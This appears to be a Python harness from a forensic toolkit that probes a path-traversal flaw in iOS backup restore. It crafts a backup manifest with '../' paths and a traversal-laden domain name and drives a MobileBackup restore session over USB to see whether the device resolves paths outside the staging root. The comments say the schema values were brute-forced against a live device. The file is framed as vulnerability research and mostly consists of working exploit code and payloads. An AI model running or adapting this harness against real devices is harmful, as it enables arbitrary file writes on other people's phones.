"""CVE-2026-84598 stage-2 harness: restore-staging path traversal test.

The CVE is in MobileBackup, not AFC. Apple's advisory: "An attacker with
physical access to a trust-paired device may be able to read and write
arbitrary files. A path traversal issue was addressed with improved path
validation." (fixed 26.7).

Hypothesis (our own, documented in docs/research-2026-09-16-afc-26.6.1.md):
during RESTORE the device resolves file destinations from paths supplied by
the host in the backup manifest. If the pre-26.7 validator fails to reject
'../' components in manifest relative paths, the device writes outside the
app-domain staging root -> arbitrary WRITE on the target.

This harness builds a minimal but structurally valid backup directory whose
manifest contains:
  1. one benign control file (must restore into its domain normally)
  2. one test file with a '../'-containing relative path aimed at a
     harmless, well-known location (/tmp or /var/mobile/Media) - NOT at
     system data

It then starts a restore session and records which files the device
requests (DLMessageDownloadFiles) and with what paths, WITHOUT completing
the transfer. Restore is interrupted at first file request, so no user
data is touched.

NOTE ON DESTRUCTIVENESS: a full restore replaces device data. This harness
aborts before transferring anything; it only observes the device's manifest
path *resolution*. If you need to confirm an actual write, that is a
separate, explicitly-consented step.

Usage:
    python3 -m opensleuth.cve2026_84598_restore --out <case_dir>
    --watch  wait until an Apple device appears on USB, then run
"""

from __future__ import annotations

import argparse
import asyncio
import hashlib
import json
import sys
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

APPLE_EPOCH = 978307200

# Schema values brute-forced against the live iOS 26.6.1 device
# (2026-09-16 research session 3, docs/research-2026-09-16-afc-26.6.1.md):
# - Manifest.plist "Version": the device float-parses this and whitelist-
#   checks it. "8.0" passes ("3.0"-5.0, 6,7,12 rejected as "Unsupported
#   properties version").
# - "SystemDomainsVersion": "19.0" passes ("26.x" rejected as "Unsupported
#   system domains version"; this is the legacy domain-map version, not the
#   OS version).
# - The device requests Manifest.mbdb (legacy binary db, NOT sqlite
#   Manifest.db). MBDB header: magic "mbdb" + u32 LE major + u16 count,
#   entry records, footer count + 0xffffffff.
RESTORE_PROPERTIES_VERSION = "8.0"
RESTORE_SYSTEM_DOMAINS_VERSION = "19.0"

# benign + traversal probes. Target = /var/mobile/Media (in-jail, harmless).
# If the device resolves '../..' out of the staging root we should see the
# resolved path in the download request (or a rejection we can distinguish).
WINDOWS: list[dict[str, Any]] = [
    {
        "label": "control-benign",
        "domain": "HomeDomain",
        "relpath": "Downloads/cve84598-control.txt",
        "expected": "in-domains",
    },
    {
        "label": "traversal-1",
        "domain": "HomeDomain",
        "relpath": "../Media/cve84598-test-1.txt",
        "expected": "in-jail-escape",
    },
    {
        "label": "traversal-deep",
        "domain": "HomeDomain",
        "relpath": "../../../Media/cve84598-test-2.txt",
        "expected": "out-jail",
    },
    {
        "label": "sysdomain-escape",
        "domain": "SysContainerDomain-../../../../../../../../..",
        "relpath": "var/tmp/cve84598-test-3.txt",
        "expected": "out-jail",
    },
]


def _mbdb_entry(domain: bytes, path: bytes) -> bytes:
    """One Manifest.mbdb record, byte layout verified against the device."""
    datahash = hashlib.sha1(path).digest()
    unknown1 = b"\x00" * 20
    e = (len(domain).to_bytes(2, "big") + domain
         + len(path).to_bytes(2, "big") + path
         + (0).to_bytes(2, "big")                    # linktarget len
         + len(datahash).to_bytes(2, "big") + datahash
         + len(unknown1).to_bytes(2, "big") + unknown1)
    e += (0o100644).to_bytes(2, "big")               # mode
    e += (0).to_bytes(8, "big")                      # inode
    e += (501).to_bytes(4, "big") + (501).to_bytes(4, "big")   # uid/gid
    e += (100).to_bytes(4, "big") * 3                # mtime/atime/ctime
    e += (0).to_bytes(8, "big")                      # len
    e += (1).to_bytes(1, "big")                      # flag (file)
    e += (0).to_bytes(1, "big")                      # property count
    return e


def build_backup_dir(root: Path, udid: str) -> Path:
    """Create a minimal structurally-valid backup dir with crafted manifest.

    Layout mirrors what a restore session expects: Manifest.plist +
    Manifest.mbdb (binary db) + per-file content. The properties/sysdom
    versions and mbdb layout were brute-forced against the live 26.6.1
    device - see RESTORE_PROPERTIES_VERSION etc above.
    """
    d = root / udid
    d.mkdir(parents=True, exist_ok=True)
    (d / "Info.plist").write_bytes(
        _plist({
            "Target Identifier": udid,
            "Target Type": "Device",
            "Product Version": "26.6.1",
            "Unique Identifier": udid,
            "Device Class": "iPhone",
            "Applications": {},
            "Installed Applications": [],
            "Build Version": "23G83",
            "Device Name": "iPhone",
            "Product Type": "iPhone12,1",
            "Serial Number": "LAB",
            "Last Backup Date": int(time.time()) - APPLE_EPOCH,
        }))
    (d / "Status.plist").write_bytes(
        _plist({
            "UUID": "LAB-84598", "BackupState": "new", "Version": "3.3",
            "Date": f"{datetime.now(timezone.utc).isoformat()}Z",
            "IsFullBackup": False, "SnapshotState": "finished",
            "DeviceName": "iPhone",
        }))
    # Manifest.plist with the ACCEPTED 26.6 restore schema
    (d / "Manifest.plist").write_bytes(
        _plist({
            "Version": RESTORE_PROPERTIES_VERSION,
            "WasPasscodeSet": False, "WasEncrypted": False,
            "SystemDomainsVersion": RESTORE_SYSTEM_DOMAINS_VERSION,
            "UUID": "LAB-84598",
            "Date": f"{datetime.now(timezone.utc).isoformat()}Z",
            "Lockdown": {},
            "BackupManifestKey": "0" * 40,
            "BackupManifestVersion": 2,
            "Files": {},
        }))
    # Manifest.mbdb: binary database the restore session actually reads
    records = b"".join(
        _mbdb_entry(w["domain"].encode(), w["relpath"].encode())
        for w in WINDOWS
    )
    mbdb = (b"mbdb"
            + (5).to_bytes(4, "little")               # major version, u32 LE
            + len(WINDOWS).to_bytes(2, "big")
            + records
            + len(WINDOWS).to_bytes(4, "big")
            + b"\xff\xff\xff\xff")
    (d / "Manifest.mbdb").write_bytes(mbdb)
    # file contents (referenced by fileID-dominant layout for later staging)
    for w in WINDOWS:
        fid = "cve84598-" + w["label"].encode().hex()
        (d / fid).write_text(f"cve84598 marker {w['label']}\n")
        sub = d / fid[:2]
        sub.mkdir(exist_ok=True)
        (sub / fid).write_text(f"cve84598 marker {w['label']}\n")
    return d


def _plist(obj) -> bytes:
    import plistlib
    return plistlib.dumps(obj)


async def _run(out: Path, watch: bool) -> int:
    from pymobiledevice3.lockdown import create_using_usbmux
    from pymobiledevice3.services.mobilebackup2 import Mobilebackup2Service

    if watch:
        from opensleuth.usb import watch_dfu
        print("waiting for any Apple device on USB (--watch)...")
        snap = watch_dfu(timeout=600.0)
        if not snap["any"]:
            print("timeout: no device appeared")
            return 1

    ld = await create_using_usbmux()
    udid = ld.udid
    root = out / "crafted-backup"
    if root.exists():
        import shutil
        shutil.rmtree(root)
    build_backup_dir(root, udid)
    print(f"crafted backup at {root / udid} ({len(WINDOWS)} mbdb entries)")

    mb2 = Mobilebackup2Service(ld)
    report = {
        "cve": "CVE-2026-84598",
        "stage": "restore-staging-probe",
        "started": datetime.now(timezone.utc).isoformat(),
        "device": {"udid": udid, "ios": ld.product_version},
        "windows": WINDOWS,
        "observed_requests": [],
        "verdict": None,
    }
    try:
        await mb2.connect()
    except Exception as exc:  # noqa: BLE001
        report["verdict"] = f"connect failed (mb2 wedged? reboot device): {exc}"
        out.mkdir(parents=True, exist_ok=True)
        (out / "cve84598-restore-probe.json").write_text(json.dumps(report, indent=2, default=str))
        print(report["verdict"])
        return 1

    # device-link handshake
    from pymobiledevice3.services.device_link import DeviceLink
    dl = DeviceLink(mb2._service, root / udid)
    try:
        await asyncio.wait_for(dl.version_exchange(), timeout=20)
        print("device-link version exchange OK")
    except Exception as exc:  # noqa: BLE001
        report["verdict"] = f"version exchange failed: {exc}"
        out.mkdir(parents=True, exist_ok=True)
        (out / "cve84598-restore-probe.json").write_text(json.dumps(report, indent=2, default=str))
        print(report["verdict"])
        return 1

    # initiate restore; run the FULL observation loop with correct
    # file-serve framing (proven against 26.6.1): serve Manifest + mbdb,
    # ack staging dirs, and keep watching for traversal resolution or the
    # Find My anti-theft gate. Never completes a file transfer (control
    # markers are the only data we serve, and they are our own).
    import struct
    SIZE_FORMAT = ">I"
    CODE_FORMAT = ">B"
    CODE_FILE_DATA = 0xC
    CODE_SUCCESS = 0
    CODE_ERROR_LOCAL = 0x6

    def frame_data(payload: bytes) -> bytes:
        return struct.pack(SIZE_FORMAT, len(payload) + 1) + struct.pack(CODE_FORMAT, CODE_FILE_DATA) + payload

    async def serve_file(relpath: str) -> bool:
        """Serve one host-side file the device requested (raw framing).

        The device requests paths relative to the backup root, e.g.
        '<UDID>/Manifest.plist' - resolve against root (the crafted dir)."""
        await dl._sendall(struct.pack(SIZE_FORMAT, len(relpath.encode())) + relpath.encode())
        p = root / relpath
        data = p.read_bytes() if p.exists() else b""
        if data:
            await dl._sendall(frame_data(data))
        await dl._sendall(struct.pack(SIZE_FORMAT, 1) + struct.pack(CODE_FORMAT, CODE_SUCCESS))
        return bool(data)

    try:
        await dl.send_process_message({
            "MessageName": "Restore", "TargetIdentifier": udid,
            "SourceIdentifier": udid,
            "Options": {"RestoreShouldNotRestoreKeychain": True,
                         "RestoreSystemFiles": False,
                         "RestorePreserveCameraRoll": True},
        })
        for _n in range(60):
            msg = await asyncio.wait_for(dl.receive_message(), timeout=20)
            code = msg[0]
            entry = {"message": f"[{code}]", "detail": None, "ts": datetime.now(timezone.utc).isoformat()}
            print(f"  [{_n}] {code}: {str(msg[1:])[:220]}")
            if code == "DLMessageDownloadFiles":
                req = msg[1] if isinstance(msg[1], list) else []
                for p in req[:6]:
                    if await serve_file(p):
                        print(f"      served {p}")
                await dl._sendall(b"\x00\x00\x00\x00")  # file transfer terminator
                await dl.status_response(0)
            elif code == "DLMessageGetFreeDiskSpace":
                await dl.status_response(0, status_dict=100 * 1024**3)
            elif code == "DLMessageCreateDirectory":
                entry["detail"] = "staging dir accepted (manifest+mbdb parsing passed)"
                report["observed_requests"].append(entry)
                await dl.status_response(0)
            elif code in ("DLMessageMoveItems", "DLMessageCopyItem"):
                entry["detail"] = str(msg[1:])[:400]
                report["observed_requests"].append(entry)
                print(f"  **** PATH-RESOLUTION MESSAGE: {str(msg[1:])[:300]}")
                break
            elif code == "DLMessageUploadFiles":
                entry["detail"] = "device reached upload stage (manifest paths resolved)"
                report["observed_requests"].append(entry)
                break
            elif code == "DLMessageProcessMessage":
                entry["detail"] = str(msg[1])[:400]
                report["observed_requests"].append(entry)
                print(f"  DEVICE: {str(msg[1])[:300]}")
                if "Error" in str(msg[1]):
                    break
    except asyncio.TimeoutError:
        report["verdict"] = "device silent after Restore init (handshake stalled - log+retry)"
    except Exception as exc:  # noqa: BLE001
        report["verdict"] = f"restore flow error: {exc}"

    # classify observed conversation
    body = " ".join(str(r.get("detail", "")) for r in report["observed_requests"])
    gate = "MustBeDisabled" not in body and "Find My" not in body
    if "Find My" in body or "211" in body or "MustBeDisabled" in body:
        report["verdict"] = (
            "GATE: manifest+mbdb with traversal paths ACCEPTED (parsing passed, "
            "staging dir created) but restore blocked by Find My iPhone (211). "
            "Schema verified; trigger requires Find My OFF."
        )
    elif "PATH-RESOLUTION" in body or "upload stage" in body or any(
            ".." in str(r.get("detail", "")) for r in report["observed_requests"]):
        report["verdict"] = "TRAVERSAL RESOLVED (device requested staged dot-dot paths) - write-test next"
    elif gate and any("CreateDirectory" in str(r.get("detail", "")) for r in report["observed_requests"]):
        report["verdict"] = "NO-GATE + staging accepted: device parsed traversal manifest without Find My block"
    else:
        report["verdict"] = report.get("verdict") or (
            "no traversal acceptance observed (device rejected or never reached file stage)"
        )
    out.mkdir(parents=True, exist_ok=True)
    (out / "cve84598-restore-probe.json").write_text(json.dumps(report, indent=2, default=str))
    print(f"\nverdict: {report['verdict']}")
    print(f"report: {out / 'cve84598-restore-probe.json'}")
    try:
        await mb2._service.close()
    except Exception:
        pass
    return 0


def main(argv=None) -> None:
    ap = argparse.ArgumentParser(prog="opensleuth.cve2026_84598_restore",
                                 description="CVE-2026-84598 restore-staging path probe")
    ap.add_argument("--out", required=True, help="report output directory")
    ap.add_argument("--watch", action="store_true",
                    help="wait (up to 600s) for an Apple device on USB first")
    args = ap.parse_args(argv)
    try:
        rc = asyncio.run(_run(Path(args.out), args.watch))
    except Exception as exc:  # noqa: BLE001
        sys.exit(f"error: {exc}")
    sys.exit(rc)


if __name__ == "__main__":
    main()